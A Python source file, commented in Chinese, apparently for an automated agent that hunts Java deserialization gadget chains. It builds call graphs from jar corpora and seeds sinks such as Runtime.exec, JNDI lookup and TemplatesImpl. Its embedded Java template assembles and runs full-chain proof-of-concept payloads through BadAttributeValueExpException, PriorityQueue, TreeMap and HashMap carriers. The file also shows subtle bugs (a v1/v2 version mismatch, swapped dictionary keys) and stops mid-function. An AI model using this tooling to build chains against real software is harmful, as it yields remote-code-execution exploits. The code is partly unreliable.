"""JGDChainCompleteAgent — 停止条件二选一: 完整链 或 穷尽证明 。

用户裁决的停止条件: 挖到完整链, 或在定义的搜索范围内彻底证明没有链。
两者之前 agent 不停; 状态持久化可断点续跑。

图数据源规则 (用户裁决 ): 图必须根据项目实时构造;
仅当已有图带语料指纹且与当前语料匹配(已跑过的系统)才允许复用。
ensure_graph() 实现该规则: 指纹不符/缺失 → 从当前语料实时重建。

完整链的判定分级(诚实优先):
  CHAIN_DEPTH2  — BAVE→桥→接收者→接收者字段对象 二级攻击者可控分派全链路触发
  CHAIN_SINK    — 任何一轮里 SINK 方法可证实执行(groovy eval 异常签名/exec 效果)
  NO_CHAIN      — (桥 × 接收者) 对全穷尽, 无触发, 带覆盖统计与失败分类

流程:
  1. ensure_graph      — 语料指纹校验: 复用或实时建图(节点/边/SINK 全现场提取)
  2. load_bridges      — jgd_chain_audit.json CONFIRM + verify 存活者, 静态取证得到
                         桥对接收者的分派方法集 (bridge_detail.target 的方法名)
  3. scan_receivers    — 图查询: 分派方法名匹配 + 距 SINK ≤3 跳 + 具体可序列化
  4. assemble+run      — JDK11 全链路 PoC; 接收者字段注入标记对象/Proxy
  5. ds 审计           — 任何 DEPTH2/SINK 触发立即回灌对抗审计
  6. 循环直到判定成立   — 状态写 jgd_chain_state.json
"""
from __future__ import annotations

import json
import sqlite3
import subprocess
import sys
import time
import zipfile
from pathlib import Path

from jgd import PROJECT_ROOT
from jgd.infra import chroma_store, scope, llm, matrix_agent as ma
from jgd.mining import staticagent

HERE = PROJECT_ROOT

DYN = Path.home() / "cfx/dyn"
ECJ = Path.home() / "cfx/tools/ecj.jar"
DB = Path.home() / "jgd/jgd_graph.db"
STATE = scope.DATA / "jgd_chain_state.json"
REPORT = scope.DATA / "chain_complete_report.md"
CP = f"{DYN}:{ma.corpus_dir()}/*:{ma.CLASSIC}/*:{ma.TOP50}/*"
JAVA_OPTS = ["-Xmx256m", "--add-opens", "java.base/sun.reflect=ALL-UNNAMED",
             "--add-opens", "java.management/javax.management=ALL-UNNAMED"]

SINK_FIRE_SIGNATURES = (
    "groovy.lang.GroovyShell", "MissingMethodException", "groovy.lang.",
    "CompilationFailedException", "Script1", "javax.naming.CommunicationException",
    "javax.naming.NamingException", "ConnectException",
)


def jdk11_java() -> str:
    for p in ("/usr/lib/jvm/java-11-openjdk-amd64/bin/java",):
        if Path(p).exists():
            return p
    return "java"


CB_BATCH = """import java.io.*;
import java.lang.reflect.*;
import java.io.File;

public class CB{n} {{
    static void clear() {{ try {{ java.nio.file.Files.deleteIfExists(
        java.nio.file.Paths.get(System.getProperty("jgd.mark"))); }}
        catch (Exception e) {{}} }}
    static boolean hit() {{ try {{
        return java.nio.file.Files.exists(
            java.nio.file.Paths.get(System.getProperty("jgd.mark"))); }}
        catch (Exception e) {{ return false; }} }}

    static boolean hasCreateMap(Class<?> ft) {{
        return createMapFor(ft, new java.util.HashMap<>()) != null;
    }}
    // Map 中介分派的接口代理 handler — 必须可序列化(lambda 不可, 载体
    // 序列化阶段即 NotSerializable)
    static class MapTail implements java.lang.reflect.InvocationHandler,
            java.io.Serializable {{
        private final Object rv;
        MapTail(Object recv) {{ rv = recv; }}
        public Object invoke(Object p, java.lang.reflect.Method m,
                Object[] a) throws Throwable {{
            try {{
                return rv.getClass().getMethod(m.getName(),
                    m.getParameterTypes()).invoke(rv, a);
            }} catch (Throwable t) {{
                System.out.println("R MAPDISPATCH " + m.getName());
                return rv.toString();
            }}
        }}
    }}
    static Object createMapFor(Class<?> ft, java.util.Map<?, ?> mm) {{
        // Map 型转发字段的构造: 本类型或其 clojure 实现类上的静态 create(Map)
        // (IPersistentMap 接口自身无 create, 在 PersistentArrayMap 上)
        if (java.util.Map.class.isAssignableFrom(ft))
            return new java.util.HashMap<>(mm);
        Class<?>[] cands;
        try {{
            cands = new Class<?>[]{{ ft,
                Class.forName("clojure.lang.PersistentArrayMap"),
                Class.forName("clojure.lang.PersistentHashMap")}};
        }} catch (Throwable t) {{ cands = new Class<?>[]{{ ft }}; }}
        for (Class<?> c : cands) {{
            try {{
                java.lang.reflect.Method m = c.getMethod("create",
                    java.util.Map.class);
                if (Modifier.isStatic(m.getModifiers())
                        && ft.isAssignableFrom(c)) {{
                    return m.invoke(null, mm);
                }}
            }} catch (Throwable ig) {{}}
        }}
        return null;
    }}
    public static void main(String[] args) {{
        String carrier = System.getProperty("jgd.carrier", "BAVE");
        String fwd = "-".equals(args[1]) ? null : args[1];
        // Map 中介分派桥: fwd 形如 field|key|iface — 转发字段是 Map 类型,
        // 接收者经 map.put(key, 接口代理) 流入(对齐 PoC 层装配语义)
        String fwdKey = null, fwdIface = null;
        if (fwd != null && fwd.indexOf('|') >= 0) {{
            String[] fp = fwd.split("\\\\|", -1);
            fwd = fp[0];
            if (fp.length > 1) fwdKey = fp[1];
            if (fp.length > 2) fwdIface = fp[2];
        }}
        try {{
            Class<?> bc = Class.forName(args[0]);
            for (int ai = 2; ai < args.length; ai++) {{
                String rn = args[ai];
                System.out.println("PAIR " + rn);
                try {{
                    Class<?> rc = Class.forName(rn);
                    Object bridge = mk(bc);
                    Object recv = mk(rc);
                    if (bridge == null || recv == null) {{
                        System.out.println("R INST_FAIL"); continue; }}
                    int inj2 = 0;
                    for (Field f : rc.getDeclaredFields()) {{
                        if (Modifier.isStatic(f.getModifiers()) ||
                            Modifier.isTransient(f.getModifiers())) continue;
                        Object v = survival(f.getType(), null);
                        if (v == SKIP) continue;
                        try {{ f.setAccessible(true); f.set(recv, v); inj2++; }}
                        catch (Throwable ig) {{}}
                    }}
                    int inj1 = 0;
                    for (Field f : bc.getDeclaredFields()) {{
                        if (Modifier.isStatic(f.getModifiers()) ||
                            Modifier.isTransient(f.getModifiers())) continue;
                        Class<?> ft = f.getType();
                        Object v;
                        if (fwdKey != null && fwd != null
                                && f.getName().equals(fwd)
                                && (java.util.Map.class.isAssignableFrom(ft)
                                    || hasCreateMap(ft))) {{
                            java.util.HashMap<Object, Object> mm =
                                new java.util.HashMap<>();
                            Object pv = recv;
                            if (fwdIface != null && !fwdIface.isEmpty()) {{
                                Class<?> ic = Class.forName(fwdIface);
                                pv = java.lang.reflect.Proxy.newProxyInstance(
                                    ic.getClassLoader(), new Class[]{{ ic }},
                                    new MapTail(recv));
                            }}
                            // 多触发键: 载体决定哪个键被查, 全部注入
                            for (String fk : fwdKey.split(",")) {{
                                if (!fk.isEmpty()) mm.put(fk, pv);
                            }}
                            if (java.util.Map.class.isAssignableFrom(ft)) {{
                                v = mm;
                            }} else {{
                                v = createMapFor(ft, mm);
                                if (v == null) {{ continue; }}
                            }}
                        }} else if (fwd != null && f.getName().equals(fwd)
                            && (ft == Object.class || ft.isInstance(recv)
                                || (ft.isInterface() && ft.isAssignableFrom(rc)))) {{
                            v = recv;
                        }} else {{
                            v = survival(ft, recv);
                            if (v == SKIP) continue;
                            if (v != recv && fwd != null && f.getName().equals(fwd))
                                continue;
                        }}
                        try {{ f.setAccessible(true); f.set(bridge, v); inj1++; }}
                        catch (Throwable ig) {{}}
                    }}
                    if (inj1 == 0) {{ System.out.println("R NOFIT"); continue; }}
                    Object b;
                    if (carrier.startsWith("HASHMAP")) {{
                        // (载体盲区): HASHMAP_EQ 双实例同尾同哈希 —
                        // readObject 重哈希触发 equals 分派(覆盖 equals 桥)
                        java.util.HashMap<Object,Object> m =
                            new java.util.HashMap<>();
                        m.put(bridge, "v");
                        if (carrier.endsWith("_EQ")) {{
                            try {{
                                Object b2 = mk(bc);
                                if (b2 != null) {{
                                    for (Field f2 : bc.getDeclaredFields()) {{
                                        if (Modifier.isStatic(f2.getModifiers())
                                            || Modifier.isTransient(f2.getModifiers()))
                                            continue;
                                        f2.setAccessible(true);
                                        f2.set(b2, f2.get(bridge));
                                    }}
                                    m.put(b2, "v2");
                                }}
                            }} catch (Throwable ig) {{}}
                        }}
                        b = m;
                    }} else if (carrier.startsWith("PRIORITY_QUEUE")) {{
                        // (致命盲区修复): PriorityQueue 载体 — readObject
                        // heapify 触发 compare()/compareTo()。覆盖 CC2/CB1 型链族。
                        java.util.PriorityQueue<Object> pq;
                        if (bridge instanceof java.util.Comparator) {{
                            pq = new java.util.PriorityQueue<>(2,
                                (java.util.Comparator) bridge);
                            pq.add(recv);
                            pq.add(recv);
                        }} else if (bridge instanceof java.lang.Comparable) {{
                            pq = new java.util.PriorityQueue<>();
                            pq.add(bridge);
                            pq.add(bridge);
                        }} else {{
                            System.out.println("R NOFIT"); continue;
                        }}
                        b = pq;
                    }} else if (carrier.startsWith("TREEMAP")) {{
                        // TreeMap 载体 — readObject put 触发 compare/compareTo
                        java.util.TreeMap<Object, Object> tm;
                        if (bridge instanceof java.util.Comparator) {{
                            tm = new java.util.TreeMap<>(
                                (java.util.Comparator) bridge);
                            tm.put(recv, "v1");
                            tm.put(recv, "v2");
                        }} else if (bridge instanceof java.lang.Comparable) {{
                            tm = new java.util.TreeMap<>();
                            tm.put(bridge, "v1");
                            tm.put(bridge, "v2");
                        }} else {{
                            System.out.println("R NOFIT"); continue;
                        }}
                        b = tm;
                    }} else {{
                        javax.management.BadAttributeValueExpException be =
                            new javax.management.BadAttributeValueExpException(null);
                        Field vf = be.getClass().getDeclaredField("val");
                        vf.setAccessible(true); vf.set(be, bridge); b = be;
                    }}
                    ByteArrayOutputStream bos = new ByteArrayOutputStream();
                    new ObjectOutputStream(bos).writeObject(b);
                    System.out.println("R SER_OK");
                    clear();
                    try {{
                        new ObjectInputStream(new ByteArrayInputStream(
                            bos.toByteArray())).readObject();
                        System.out.println("R DESER_COMPLETE hop2=" + hit());
                        if (hit()) {{
                            try {{
                                for (String fr2 : new String(java.nio.file.Files
                                        .readAllBytes(java.nio.file.Paths.get(
                                            System.getProperty("jgd.mark"))),
                                        "UTF-8").split("\\n"))
                                    if (!fr2.isEmpty())
                                        System.out.println("R DSTACK " + fr2);
                            }} catch (Exception e9) {{}}
                        }}
                    }} catch (Throwable t) {{
                        System.out.println("R EX " + t.getClass().getName()
                            + " hop2=" + hit());
                        if (hit()) {{
                            try {{
                                for (String fr2 : new String(java.nio.file.Files
                                        .readAllBytes(java.nio.file.Paths.get(
                                            System.getProperty("jgd.mark"))),
                                        "UTF-8").split("\\n"))
                                    if (!fr2.isEmpty())
                                        System.out.println("R DSTACK " + fr2);
                            }} catch (Exception e9) {{}}
                        }}
                        for (StackTraceElement f2 : t.getStackTrace())
                            if (f2.getClassName().equals(rn)) {{
                                System.out.println("R RECVFRAME"); break; }}
                        inspect(t);
                        Throwable c = t.getCause();
                        int d = 0;
                        while (c != null && d++ < 5) {{ inspect(c);
                            c = c.getCause(); }}
                    }}
                }} catch (Throwable t) {{
                    System.out.println("R OUTER_EX " + t.getClass().getName());
                }}
            }}
        }} catch (Throwable t) {{
            System.out.println("R FATAL " + t);
        }}
    }}
    static void inspect(Throwable t) {{
        String s = t.toString() + " " + String.valueOf(t.getMessage());
        if (s.contains("groovy") || s.contains("javax.naming")
            || s.contains("javax.script")) System.out.println("R SINKSIG");
        if (s.contains("JGDCANARY")) System.out.println("R CANARY");
    }}
    static final Object SKIP = new Object();
    //  字段契约合成: 除转发字段外全字段注"存活值" — 具体类裸实例/空数组
    // 是新能力, 修复空状态 NPE (carrier_fail 90% 的根因)
    static Object survival(Class<?> ft, Object recv) {{
        try {{
            if (ft == Object.class) return recv != null ? recv : new MV{n}();
            if (ft == String.class) return "JGDCANARY{n}";
            // (sink参数盲区): 类型化 canary — URL/URI 字段带可观测协议串,
            // 异常消息回显即值流证据
            if (ft == java.net.URL.class)
                return new java.net.URL("http://jgdcanary.invalid/p{n}");
            if (ft == java.net.URI.class)
                return java.net.URI.create("jgdcanary://invalid/p{n}");
            if (ft == Class.class) return Object.class;
            if (ft.isInterface() || Modifier.isAbstract(ft.getModifiers())) {{
                try {{
                    return Proxy.newProxyInstance(ft.getClassLoader(),
                        new Class[]{{ft}}, new MV{n}());
                }} catch (Throwable t) {{ return SKIP; }}
            }}
            if (ft.isArray()) {{
                try {{
                    return java.lang.reflect.Array.newInstance(
                        ft.getComponentType(), 0);
                }} catch (Throwable t) {{ return SKIP; }}
            }}
            if (ft.isPrimitive()) return SKIP;
            Object bare = mk(ft);
            return bare != null ? bare : SKIP;
        }} catch (Throwable t) {{ return SKIP; }}
    }}
    static Object mk(Class<?> c) {{
        try {{ return c.getDeclaredConstructor().newInstance(); }}
        catch (Throwable t) {{
            try {{
                Constructor<?> ctor = sun.reflect.ReflectionFactory
                    .getReflectionFactory()
                    .newConstructorForSerialization(c,
                        Object.class.getDeclaredConstructor());
                ctor.setAccessible(true); return ctor.newInstance();
            }} catch (Throwable t2) {{ return null; }}
        }}
    }}
}}
"""


def sh(cmd, timeout=90):
    p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, cwd=HERE)
    return p.returncode, p.stdout + p.stderr


LIVE_DB = Path.home() / "jgd/jgd_graph_live.db"


def corpus_fingerprint() -> str:
    return ma.corpus_fingerprint()


def _sink_inventory() -> list[tuple[str, str]]:
    """SINK 种子集: 已跑系统清单 + sink_points_live 六类 + 经典 RCE/JNDI/字节码族。

    仅 14 条 groovy 定义时反向可达近空(pairs=0 的假穷尽) — 扩展种子面。
    """
    inv: list[tuple[str, str]] = []
    try:
        conn = sqlite3.connect(str(DB))
        conn.row_factory = sqlite3.Row
        inv += [(r["owner"], r["signature"].split("(")[0])
                for r in conn.execute(
                    "SELECT owner, signature FROM nodes WHERE role='SINK'")]
        conn.close()
    except Exception:
        pass
    sp = HERE / "sink_points_live.json"
    if sp.exists():
        try:
            for _cat, items in json.loads(sp.read_text(encoding="utf-8")).items():
                for it in items if isinstance(items, list) else []:
                    c = it.get("class")
                    if c:
                        inv.append((c, "*"))
        except Exception:
            pass
    inv += [
        ("java.lang.Runtime", "exec"),
        ("java.lang.ProcessBuilder", "start"),
        ("javax.script.ScriptEngine", "eval"),
        ("javax.script.ScriptEngineManager", "getEngineByName"),
        ("javax.naming.InitialContext", "lookup"),
        ("javax.naming.spi.NamingManager", "getObjectInstance"),
        ("java.lang.reflect.Method", "invoke"),
        ("java.lang.ClassLoader", "defineClass"),
        ("java.lang.ClassLoader", "loadClass"),
        ("javax.xml.transform.Templates", "newTransformer"),
        ("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
         "newTransformer"),
        ("org.springframework.cglib.core.ReflectUtils", "invoke"),
        ("groovy.lang.GroovyShell", "evaluate"),
        ("groovy.lang.GroovyShell", "parse"),
        ("groovy.lang.GroovyClassLoader", "parseClass"),
        # clojure 式函数接口 sink: IFn.invoke 携带攻击者求值体
        ("clojure.lang.IFn", "invoke"),
        ("clojure.lang.Var", "invoke"),
    ]
    seen: set[tuple[str, str]] = set()
    return [x for x in inv if not (x in seen or seen.add(x))]


def add_dispatch_edges(gdb: Path, fp: str) -> int:
    """ CHA 分派边: (接口, m) → (实现类, m)。

    无分派边的调用图在接口分派边界系统性断裂 —— 桥调 x.transform() 只连到
    (Transformer, transform) 接口节点, 而真正的 sink 路径在实现类节点上。
    反序列化链的本质就是多态分派, 反向可达必须补 CHA 边才能接通。
    幂等: meta.dispatch_edges 记录 (指纹, 版本)。
    """
    conn = sqlite3.connect(str(gdb))
    meta = {r[0]: r[1] for r in conn.execute("SELECT key, value FROM meta")}
    if meta.get("dispatch_edges") == f"{fp}:v1":
        conn.close()
        return 0
    print("[graph/cha] 补分派边 (语料一遍扫描)...")
    iface_impls: dict[str, list[str]] = {}
    cls_methods: dict[str, set[str]] = {}
    t0 = time.time()
    for jar in sorted(ma.corpus_dir().glob("*.jar")):
        try:
            with zipfile.ZipFile(jar) as z:
                for ent in z.namelist():
                    if not ent.endswith(".class") or "$" in ent:
                        continue
                    try:
                        ci = staticagent.parse_class(z.read(ent))
                    except Exception:
                        continue
                    if not ci:
                        continue
                    this = ci["this"]
                    ms = {mn for (mn, _md) in ci.get("methods", {}).keys()}
                    cls_methods[this] = ms
                    for i in ci.get("ifcs", []):
                        iface_impls.setdefault(i, []).append(this)
        except Exception:
            continue
    # 只做接口层 CHA (Comparator/Transformer/InvocationHandler 等全是接口);
    # 抽象超类→子类需要额外 super 索引, 留待需要时再加
    want_owners = set(iface_impls.keys())
    ph = ",".join("?" * min(len(want_owners), 3000))
    node_ids: dict[tuple[str, str], int] = {}
    for r in conn.execute(
            f"SELECT node_id, owner, mname FROM nodes WHERE owner IN ({ph})",
            list(want_owners)[:3000]):
        node_ids[(r[0], r[1])] = r[2]
    edges: list[tuple[int, int]] = []
    for iface, impls in iface_impls.items():
        for imn, iid in [(k[1], v) for k, v in node_ids.items() if k[0] == iface]:
            for impl in impls:
                if imn in cls_methods.get(impl, set()):
                    key = (impl, imn)
                    if key in node_ids:
                        continue
                    row = conn.execute(
                        "SELECT node_id FROM nodes WHERE owner=? AND mname=?",
                        (impl, imn)).fetchone()
                    if row:
                        node_ids[key] = row[0]
                        edges.append((iid, row[0]))
    conn.executemany("INSERT OR IGNORE INTO edges VALUES (?,?)", edges)
    # (反射可见性盲区): 反射 API 节点(Class.forName/Method.invoke/lookup)
    # 交给 retag_sinks 作种子 — 其调用者自动成为 dist-1 接收者
    conn.execute("INSERT OR REPLACE INTO meta VALUES ('dispatch_edges', ?)",
                 (f"{fp}:v2",))
    conn.commit()
    conn.close()
    print(f"[graph/cha] +{len(edges)} 分派边 ({time.time() - t0:.0f}s)")
    return len(edges)


def retag_sinks(gdb: Path, sink_keys: set[tuple[str, str]]) -> int:
    """sink 种子扩展后重打角色(边不动); 返回命中 sink 方法数。"""
    conn = sqlite3.connect(str(gdb))
    conn.execute("UPDATE nodes SET role='METHOD' WHERE role='SINK'")
    n = 0
    for owner, mname in sink_keys:
        if mname == "*":
            cur = conn.execute(
                "UPDATE nodes SET role='SINK' WHERE owner=?", (owner,))
        else:
            cur = conn.execute(
                "UPDATE nodes SET role='SINK' WHERE owner=? AND mname=?",
                (owner, mname))
        n += cur.rowcount if cur.rowcount > 0 else 0
    conn.commit()
    conn.close()
    return n


def discover_product_sinks() -> list[tuple[str, str]]:
    """产品自有 sink 发现 — 目标语料内直接调用危险原语名的方法
    (产品私有脚本引擎/命令分发器等) 加入 sink 种子。图边已含全部调用关系,
    这里只做一次 SQL 筛选。"""
    danger = ("exec", "eval", "loadClass", "defineClass", "lookup",
              "invoke", "getRuntime", "newInstance", "parseClass",
              "newTransformer", "connect", "start")
    classic_owners = {o for o, _m in _sink_inventory()}
    out = []
    try:
        conn = sqlite3.connect(str(LIVE_DB))
        conn.row_factory = sqlite3.Row
        q = ("SELECT DISTINCT n2.owner AS owner, n1.mname AS caller "
             "FROM edges e JOIN nodes n1 ON n1.node_id=e.src "
             "JOIN nodes n2 ON n2.node_id=e.dst "
             "WHERE n2.mname IN (%s) LIMIT 400"
             % ",".join("?" * len(danger)))
        for r in conn.execute(q, list(danger)):
            owner = r["owner"]
            if (owner.startswith(("java/", "javax/", "jdk/", "sun/"))
                    or (owner, r["caller"]) in out
                    or owner in classic_owners):
                continue
            out.append((owner, r["caller"]))
        conn.close()
    except Exception:
        pass
    return out[:120]


def ensure_graph(verbose: bool = True) -> Path:
    """图实时构造规则。指纹匹配的已跑图才复用, 否则从当前语料重建。"""
    fp = corpus_fingerprint()
    if LIVE_DB.exists():
        conn = sqlite3.connect(str(LIVE_DB))
        meta = {r[0]: r[1] for r in conn.execute(
            "SELECT key, value FROM meta")} if _has_table(conn, "meta") else {}
        conn.close()
        if meta.get("corpus_fingerprint") == fp:
            if verbose:
                print(f"[graph] 复用已跑系统 {LIVE_DB.name} (指纹 {fp} 匹配)")
            return LIVE_DB

    if verbose:
        print(f"[graph] 实时构造 (当前语料指纹 {fp}) — 解析 {len(list(ma.corpus_dir().glob('*.jar')))} jars")
    sinks = _sink_inventory()
    sink_keys = {(o.replace(".", "/"), m) for o, m in sinks}

    conn = sqlite3.connect(str(LIVE_DB))
    conn.executescript("""
        DROP TABLE IF EXISTS nodes; DROP TABLE IF EXISTS edges; DROP TABLE IF EXISTS meta;
        CREATE TABLE meta (key TEXT PRIMARY KEY, value TEXT);
        CREATE TABLE nodes (node_id INTEGER PRIMARY KEY, owner TEXT, mname TEXT,
                            role TEXT);
        CREATE TABLE edges (src INTEGER, dst INTEGER);
        CREATE INDEX idx_edges_dst ON edges(dst);
        CREATE INDEX idx_nodes_owner ON nodes(owner);
    """)
    node_id: dict[tuple[str, str], int] = {}

    def nid(owner: str, mname: str) -> int:
        k = (owner, mname)
        if k not in node_id:
            node_id[k] = len(node_id) + 1
        return node_id[k]

    batch_nodes: list[tuple[int, str, str, str]] = []
    batch_edges: list[tuple[int, int]] = []
    n_classes = 0
    t0 = time.time()
    for ji, jar in enumerate(sorted(ma.corpus_dir().glob("*.jar")), 1):
        try:
            with zipfile.ZipFile(jar) as z:
                for ent in z.namelist():
                    if not ent.endswith(".class") or "$" in ent:
                        continue
                    try:
                        ci = staticagent.parse_class(z.read(ent))
                    except Exception:
                        continue
                    if not ci:
                        continue
                    n_classes += 1
                    owner = ci["this"]
                    for (mn, _md), calls in ci.get("methods", {}).items():
                        src = nid(owner, mn)
                        for tc, tm, _td in calls:
                            dst = nid(tc, tm)
                            batch_edges.append((src, dst))
        except Exception:
            continue
        if ji % 100 == 0 and verbose:
            el = time.time() - t0
            print(f"  [graph] {ji} jars, {n_classes} classes, "
                  f"{len(batch_edges)} edges ({el:.0f}s)")
        if len(batch_edges) > 400_000:
            conn.executemany("INSERT OR IGNORE INTO edges VALUES (?,?)", batch_edges)
            batch_edges.clear()

    if batch_edges:
        conn.executemany("INSERT OR IGNORE INTO edges VALUES (?,?)", batch_edges)
    role_rows = []
    for (owner, mname), i in node_id.items():
        role = "SINK" if (owner, mname) in sink_keys else "METHOD"
        role_rows.append((i, owner, mname, role))
    for i in range(0, len(role_rows), 100_000):
        conn.executemany("INSERT OR REPLACE INTO nodes VALUES (?,?,?,?)",
                         role_rows[i:i + 100_000])
    conn.execute("CREATE TABLE ed AS SELECT DISTINCT src, dst FROM edges")
    conn.execute("DROP TABLE edges")
    conn.execute("ALTER TABLE ed RENAME TO edges")
    conn.execute("CREATE INDEX IF NOT EXISTS idx_edges_dst ON edges(dst)")
    conn.execute("INSERT INTO meta VALUES ('corpus_fingerprint', ?)", (fp,))
    conn.execute("INSERT INTO meta VALUES ('built_at', ?)",
                 (time.strftime("%FT%T"),))
    conn.commit()
    n_nodes = conn.execute("SELECT COUNT(*) FROM nodes").fetchone()[0]
    n_edges = conn.execute("SELECT COUNT(*) FROM edges").fetchone()[0]
    conn.close()
    if verbose:
        print(f"[graph] 完成: {n_nodes} 方法节点, {n_edges} 边, "
              f"{len(sink_keys)} sink 定义 ({time.time() - t0:.0f}s)")
    return LIVE_DB


def _has_table(conn, name: str) -> bool:
    return bool(conn.execute(
        "SELECT 1 FROM sqlite_master WHERE type='table' AND name=?", (name,)
    ).fetchone())


class JGDChainCompleteAgent:
    def __init__(self):
        # (语料分域): 状态文件按语料指纹隔离 — 换语料自动归档旧状态,
        # 防止旧语料的 tried_pairs/桥池污染新语料 (apache2026 实验暴露)
        fp = corpus_fingerprint()
        if STATE.exists():
            old = json.loads(STATE.read_text(encoding="utf-8"))
            if old.get("corpus_fp") not in (None, fp):
                STATE.rename(STATE.with_name(
                    f"jgd_chain_state.{old['corpus_fp'][:8]}.json"))
                print(f"[语料分域] 语料变更: 旧状态归档 -> {old['corpus_fp'][:8]}")
        self.db = chroma_store.VStore()
        self.state = (json.loads(STATE.read_text(encoding="utf-8"))
                      if STATE.exists() else
                      {"tried_pairs": [], "verdict": None, "evidence": [],
                       "rounds": 0, "coverage": {}, "corpus_fp": fp})
        self.state["corpus_fp"] = fp

    def save(self):
        STATE.write_text(json.dumps(self.state, ensure_ascii=False, indent=1),
                         encoding="utf-8")

    # ---------------- 1. bridges ----------------

    def load_bridges(self) -> list[dict]:
        """桥池 = 链审计 CONFIRM ∪ evolve TRIGGERED(链PoC已证) ∪ verify 存活者。
        ds 审计非确定性不允许踢掉链 PoC 已证实的桥。"""
        cand: dict[str, dict] = {}
        ca = scope.scoped(HERE / "jgd_chain_audit.json")
        if ca.exists():
            for r in json.loads(ca.read_text(encoding="utf-8")):
                if r.get("final_verdict") == "CONFIRM":
                    cand[r["cls"]] = {"cls": r["cls"], "prio": 1,
                                      "why": "jgd_chain_audit CONFIRM"}
        ev = scope.scoped(HERE / "evolve_v2_state.json")
        if ev.exists():
            for d in json.loads(ev.read_text(encoding="utf-8")).get("discoveries", []):
                if ("TRIGGERED" in ((d.get("chain") or {}).get("chain_verdict")
                                    or "") and d["cls"] not in cand):
                    cand[d["cls"]] = {"cls": d["cls"], "prio": 1,
                                      "why": "链PoC TRIGGERED"}
        for g in self._verify_survivors():
            cand.setdefault(g, {"cls": g, "prio": 2, "why": "verify survivor"})
        # (ds反思: 入口命中率): 57 个 INTERESTING 里每轮只审 12-15,
        # 未审计的 40+ 个桥从未参与配对 —— 潜在链最大的未挖面, prio 3 放开
        vs = scope.DATA / "verify_state.json"
        if vs.exists():
            for g in json.loads(vs.read_text(encoding="utf-8")).get("graded", []):
                if g.get("grade") == "INTERESTING":
                    cand.setdefault(g["cls"],
                                    {"cls": g["cls"], "prio": 3,
                                     "why": "verify INTERESTING 未审计"})
            # (深度盲区): 链延伸递归 — DEPTH2 接收者为桥(深度3),
            # 其 evidence 再延伸一层(深度4)
            ext_receivers = {e.get("receiver", "").replace("/", ".")
                             for e in self.state.get("evidence", [])
                             if e.get("result", {}).get("verdict") == "CHAIN_DEPTH2"}
            for e in self.state.get("evidence", []):
                r = e.get("receiver", "")
                rd = r.replace("/", ".")
                if r and e.get("result", {}).get("verdict") == "CHAIN_DEPTH2":
                    cand.setdefault(rd, {"cls": rd, "prio": 2,
                                         "why": "DEPTH2链延伸(深度3)"})
                elif rd in ext_receivers:
                    cand.setdefault(e.get("bridge", "").replace("/", "."),
                                    {"cls": e.get("bridge", "").replace("/", "."),
                                     "prio": 4, "why": "链延伸(深度4)"})
        out = []
        for b in sorted(cand.values(), key=lambda x: x["prio"]):
            evd = self._static_evidence(b["cls"])
            if not evd or not evd.get("bridge_detail"):
                continue
            # 接收者桥的 dispatch=目标方法名; 参数桥的 dispatch=触发器名
            # (静态助手内部对 arg 分派 equals/hashCode/toString, 取保守并集)
            disp: set[str] = set()
            for t in evd["bridge_detail"]:
                if t.get("via") == "arg":
                    disp.update({"equals", "hashCode", "toString"})
                else:
                    disp.add(t["target"].split("(")[0].split(".")[-1])
            out.append({**b, "evidence": evd, "dispatch": sorted(disp)})
        print(f"[bridges] {len(out)} 个确认桥:")
        for b in out:
            print(f"  {b['cls']} dispatch={b['dispatch']} ({b['why']})")
        return out

    def _verify_survivors(self) -> list[str]:
        vs = scope.DATA / "verify_state.json"
        if not vs.exists():
            return []
        return [a["cls"] for a in json.loads(vs.read_text(encoding="utf-8"))
                .get("audited", [])
                if a.get("final_verdict") in ("DISPUTED", "CONFIRM")]

    def _static_evidence(self, cls: str) -> dict | None:
        for jar in sorted(ma.corpus_dir().glob("*.jar")):
            r = ma.static_probe(str(jar), cls)
            if r.get("verdict") == "NOT_FOUND":
                continue
            r["jar"] = jar.name
            return r
        return None

    # ---------------- 2. receivers ----------------

    def scan_receivers(self, dispatch: list[str], cap: int = 60) -> list[dict]:
        """距 SINK ≤3 跳(含 CHA 分派边) + 触发方法 ∈ dispatch + 具体可序列化。

        池按 dispatch 集合缓存 —— 381 桥的 dispatch 大量重复
        (绝大多数={equals,hashCode,toString}), 每轮重复图BFS+jar验证是瓶颈。
        """
        cache_f = scope.DATA / "receiver_pool_cache.json"
        key = corpus_fingerprint() + "|" + ",".join(sorted(dispatch))
        cache = (json.loads(cache_f.read_text(encoding="utf-8"))
                 if cache_f.exists() else {})
        if key in cache:
            return cache[key]
        gdb = ensure_graph()
        fp = corpus_fingerprint()
        add_dispatch_edges(gdb, fp)
        n_sinks = retag_sinks(
            gdb,
            {(o.replace(".", "/"), m) for o, m in _sink_inventory()}
            | {(o, m) for o, m in discover_product_sinks()}
            | {("java/lang/Class", "forName"),
               ("java/lang/reflect/Method", "invoke"),
               ("javax/naming/InitialContext", "lookup"),
               ("java/lang/ClassLoader", "loadClass")})
        print(f"[receivers] sink 种子重打完成: {n_sinks} 个方法节点 "
              f"(含产品自有 sink)")
        conn = sqlite3.connect(str(gdb))
        conn.row_factory = sqlite3.Row
        id2node = {}
        sinks = [r["node_id"] for r in conn.execute(
            "SELECT node_id FROM nodes WHERE role='SINK'")]
        reach: dict[int, int] = {s: 0 for s in sinks}
        frontier = list(sinks)
        for dist in (1, 2, 3):
            if not frontier:
                break
            q = (f"SELECT e.src AS sid, n.owner AS owner, n.mname AS mname "
                 f"FROM edges e JOIN nodes n ON n.node_id = e.src "
                 f"WHERE e.dst IN ({','.join('?' * len(frontier))})")
            rows = conn.execute(q, frontier).fetchall()
            new_frontier = []
            for r in rows:
                nid_ = r["sid"]
                if nid_ in reach:
                    continue
                reach[nid_] = dist
                new_frontier.append(nid_)
                id2node[nid_] = (r["owner"], r["mname"])
            frontier = new_frontier
        recs = []
        for nid_, dist in reach.items():
            owner, mname = id2node.get(nid_, (None, None)) if nid_ in id2node else (None, None)
            if nid_ not in id2node:
                row = conn.execute(
                    "SELECT owner, mname FROM nodes WHERE node_id=?",
                    (nid_,)).fetchone()
                if not row:
                    continue
                owner, mname = row["owner"], row["mname"]
            if mname not in dispatch or not owner:
                continue
            # 接收者池不排除 $-内部类(桥发现层才排除匿名类);
            # $-类如 EqualsBean$foo 可能是关键中介
            recs.append({"cls": owner, "method": mname, "dist": dist})
        conn.close()
        recs = list({x["cls"]: x for x in recs}.values())
